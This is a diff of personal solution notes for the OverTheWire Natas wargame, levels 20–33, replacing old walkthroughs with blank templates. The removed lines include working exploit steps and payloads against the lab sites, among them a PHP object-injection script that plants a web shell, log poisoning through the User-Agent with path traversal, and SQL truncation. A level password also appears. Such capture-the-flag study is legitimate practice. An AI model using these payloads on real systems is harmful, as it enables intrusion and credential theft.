+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 
+
 
 Level 20
-Goal:
-You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
-Your name: 
+
+Information Given:
+"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. "
+
+We are given an input box titled "Your name:", a button titled "Change name", as well as the source code.
 
 Solution:
-Open "View sourcecode" in a new tab.
 
-Search Google for "php session_set_save_handler".
-Read: http://php.net/manual/en/function.session-set-save-handler.php
 
-curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201" --cookie "PHPSESSID=owned"
+Password:
 
-curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org" --cookie "PHPSESSID=owned"
 
 Level 21
-Goal:  
-Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
-You are logged in as a regular user. Login as an admin to retrieve credentials for natas22. 
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Click on the experimenter link.
-Open "View sourcecode" in a new tab.
-Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
-Open Burp Suite and go to the Proxy section with Intercept On.
-Click the 'Update' button on the experimenter page.
-Add '&admin=1' to the end, and copy the PHPSESSID.
-Forward.
-Refresh the main page, and set the PHPSESSID to what we copied.
-Forward.
+
+
+Password:
+
 
 Level 22
-Goal:
-A seemingly empty page.
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
-Open Burp Suite and go to the Proxy section with Intercept On.
-Add '?revelio=1' to the end of the URL and press enter.
-Right-click on the Burp output -> Do intercept -> Response to this request
-Forward
+
+
+Password:
+
 
 Level 23
-Goal:
-Password: 
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-20iloveyou
+
+
+Password:
+
 
 Level 24
-Goal:
-Password: 
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Search Google for "strcmp".
-Read: http://php.net/manual/en/function.strcmp.php
-Search Google for "strcmp vulnerability php".
-Read: https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet
-Add '?passwd[]=a' to the URL and press enter.
+
+
+Password:
+
 
 Level 25
-Goal:
-Quote
 
-You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
-Scientist, Bad Boy Bubby
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
-Open Burp Suite and go to the Proxy section with Intercept On.
-Click the language button -> de.
-Set the User-Agent to: <?php echo file_get_contents('/etc/natas_webpass/natas26') ?>
-Set the PHPSESSID to: owned
-Set lang GET request to: ....//....//....//....//....//tmp/natas25_owned.log
-Right-click on the Burp output -> Do intercept -> Response to this request
-Forward
+
+
+Password:
+
 
 Level 26
-Goal:
-Draw a line:
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Search Google for "php object injection".
-Read: https://www.owasp.org/index.php/PHP_Object_Injection
-Copy the 'Logger' class from the sourcecode.
 
-cat > 26owned.php
-<?php
-    
-    class Logger{
-        private $logFile;
-        private $initMsg;
-        private $exitMsg;
-      
-        function __construct($file){
-            // initialise variables
-            $this->initMsg="";
-            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27');?>";
-            $this->logFile = "img/owned.php";
-      
-            // write initial message
-            $fd=fopen($this->logFile,"a+");
-            fwrite($fd,$initMsg);
-            fclose($fd);
-        }                       
-      
-        function log($msg){
-            $fd=fopen($this->logFile,"a+");
-            fwrite($fd,$msg."\n");
-            fclose($fd);
-        }                       
-      
-        function __destruct(){
-            // write exit message
-            $fd=fopen($this->logFile,"a+");
-            fwrite($fd,$this->exitMsg);
-            fclose($fd);
-        }                       
-    }
-echo base64_encode(serialize(new Logger()));
 
-?>
+Password:
 
-php 26owned.php
-Copy the new cookie.
-Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
-Open Burp Suite and go to the Proxy section with Intercept On.
-Type whatever you want on the fields in the website and hit Draw.
-Replace the 'drawing' cookie with our new cookie.
-Forward.
-We'll get an error, but it's fine. Browse to: http://natas26.natas.labs.overthewire.org/img/owned.php
 
 Level 27
-Goal:
-Username:
-Password: 
+
+Information Given:
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Search Google for "mysql_fetch_assoc".
-Read: https://dev.mysql.com/doc/apis-php/en/apis-php-function.mysql-fetch-assoc.html
-Open Python in a terminal.
-"natas28" + (" " * 69) + "owned"
-Copy the output (minus the quotes) and paste it in the Username field.
-Go back to the index page and enter natas28 in the Username field.
+
+
+Password:
+
 
 Level 28
-Goal:
- Whack Computer Joke Database
-Search:
-sorry, we are currently out of sauce
+
+Information Given:
+
 
 Solution:
-Right-click -> View Page Source.
-Enter in the field: 0
-Enter in the field: 1
-Enter in the field: 2
-Enter in the field: 3
-Enter in the field: 4
-Enter in the field: <?php echo exec("cat /etc/natas_webpass/natas29"); ?>
-Browse to: http://natas28.natas.labs.overthewire.org/search.php/?query=admin
-Search Google for "pkcs#7 padding vulnerability".
-Read: https://en.wikipedia.org/wiki/Padding_oracle_attack
-Search Google for "ecb encryption".
-Read: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
-Search Google for "burp intruder ecb".
-Read: http://blog.portswigger.net/2011/10/breaking-encrypted-data-using-burp.html
-With search query "a": G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP
-KriAqPE2%2B%2BuYlniRMkobB1
-vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
-With search query "b": G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP
-IYiwNnSJY7KHJGU%2BXjuMzV
-vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
-Notice where our query is, the different strings, 
-we can directly talk to the application by replacing the string
-We can also adjust padding accordingly by reducing characters left to our string
 
 
-G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPalmost(!)vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
-
-
-
+Password:
 
 
 Level 29
-Goal:
+
+Information Given:
 
 
 Solution:
+
+
+Password:
 
 
 Level 30
-Goal:
+
+Information Given:
 
 
 Solution:
+
+
+Password:
 
 
 Level 31
-Goal:
+
+Information Given:
 
 
 Solution:
+
+
+Password:
 
 
 Level 32
-Goal:
+
+Information Given:
 
 
 Solution:
+
+
+Password:
 
 
 Level 33
-Goal:
+
+Information Given:
 
 
 Solution:
 
 
-
-
+Password:
 
